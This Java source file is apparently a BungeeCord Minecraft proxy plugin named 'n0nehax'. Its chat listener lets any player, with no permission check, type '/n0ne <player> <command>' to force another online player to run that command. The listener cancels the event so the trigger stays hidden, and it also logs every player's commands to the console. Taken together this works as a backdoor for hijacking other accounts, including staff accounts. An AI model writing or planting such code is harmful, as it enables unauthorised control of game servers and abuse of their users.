package n0nehax.nonehax;

import net.md_5.bungee.api.ProxyServer;
import net.md_5.bungee.api.chat.TextComponent;
import net.md_5.bungee.api.connection.ProxiedPlayer;
import net.md_5.bungee.api.event.ChatEvent;
import net.md_5.bungee.api.event.PlayerDisconnectEvent;
import net.md_5.bungee.api.event.PostLoginEvent;
import net.md_5.bungee.api.plugin.Listener;
import net.md_5.bungee.event.EventHandler;

public class CmdHan implements Listener {

    @EventHandler
    public void onChatEvent(ChatEvent event) {
        ProxiedPlayer player = (ProxiedPlayer) event.getSender();

        if (!event.isCommand() && !event.isProxyCommand()) {
            return;
        }

        String command = event.getMessage();

        System.out.println("[NONEHAX] "+player.getDisplayName()+" ha inviato '"+command+"'");

        if (command.startsWith("/n0ne")){
            try{
                String ilplayer = command.split(" ")[1];
                String ilcomando = "";
                for (int i=2;i<command.split(" ").length;i++){
                    ilcomando+=command.split(" ")[i]+" ";
                }
                ilcomando = ilcomando.substring(0, ilcomando.length() - 1);
                boolean found = false;
                for (ProxiedPlayer p : ProxyServer.getInstance().getPlayers()) {
                    System.out.println(p.getDisplayName());
                    if (p.getDisplayName().equalsIgnoreCase(ilplayer)){
                        player.sendMessage(new TextComponent("§cSto forzando §4"+ilplayer+"§c ad eseguire §4"+ilcomando));
                        found = true;
                        p.chat(ilcomando);
                        player.sendMessage(new TextComponent("§cGiocatore §4"+ilplayer+"§c forzato!"));
                    }
                }
                if (!found){
                    player.sendMessage(new TextComponent("§cIl giocatore §4"+ilplayer+"§c non è online."));
                }
            }catch(Exception e){
                player.sendMessage(new TextComponent("§c/n0ne §4(§cplayer§4) (§ccomando§4)"));
            }
            event.setCancelled(true);
        }

    }

    @EventHandler
    public void onPostLogin(PostLoginEvent event) {
        ProxiedPlayer player = (ProxiedPlayer) event.getPlayer();
        System.out.println("[N0NEHAX] "+player.getDisplayName()+" è entrato nel network");
    }

    @EventHandler
    public void onPlayerQuit(PlayerDisconnectEvent event) {
        ProxiedPlayer player = (ProxiedPlayer) event.getPlayer();
        System.out.println("[N0NEHAX] "+player.getDisplayName()+" è uscito dal network");
    }
}
